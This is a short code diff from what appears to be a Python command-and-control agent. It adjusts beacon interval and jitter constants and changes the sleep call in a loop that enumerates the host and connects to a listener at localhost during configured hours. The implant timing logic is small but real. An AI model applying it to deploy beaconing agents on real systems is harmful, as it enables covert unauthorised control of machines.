@@ -17,8 +17,8 @@ from random import randrange
 _LISTENER_HOST = "localhost"
 _LISTENER_PORT = 1235
 _LISTENER_SECRET = "whatever"
-_AGENT_BEACON_INTERVAL = 0.1
-_AGENT_BEACON_JITTER = 2
+_AGENT_BEACON_INTERVAL = 0.5
+_AGENT_BEACON_JITTER = 0
 _AGENT_START_TIME = datetime.time(0, 0, 0)
 _AGENT_END_TIME = datetime.time(23, 59, 0)
 _AGENT_SOCKET_TIMEOUT = 2
@@ -264,7 +264,7 @@ class Agent:
         self.enumdata = self.enum_host()
         _AGENT_STATE_ENUM = 0
         while True:
-            time.sleep(_AGENT_BEACON_INTERVAL + randrange(_AGENT_BEACON_JITTER))
+            time.sleep(_AGENT_BEACON_INTERVAL + randrange(_AGENT_BEACON_JITTER) if _AGENT_BEACON_JITTER > 0 else _AGENT_BEACON_INTERVAL)
             if _AGENT_START_TIME <= datetime.datetime.now().time() <= _AGENT_END_TIME:
                 if _AGENT_STATE_ENUM == 0:
                     if self.init_socket():
